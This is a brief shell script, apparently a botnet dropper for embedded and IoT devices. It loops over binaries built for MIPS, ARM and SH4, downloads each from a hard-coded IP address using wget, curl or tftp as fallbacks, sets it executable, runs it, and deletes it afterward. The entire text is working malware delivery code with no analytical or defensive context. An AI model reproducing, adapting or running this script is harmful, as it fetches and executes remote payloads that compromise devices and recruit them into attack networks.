binarys="kmips kmpsl karm7 karm4 ksh4 karm6 karm5 karm"
server_ip="93.88.204.7"
for arch in $binarys
do
rm -rf $arch
wget http://$server_ip/$arch || curl -O http://$server_ip/$arch || tftp $server_ip -c get $arch || tftp -g -r $arch $server_ip
chmod 777 $arch
./$arch $1
rm -rf $arch
done
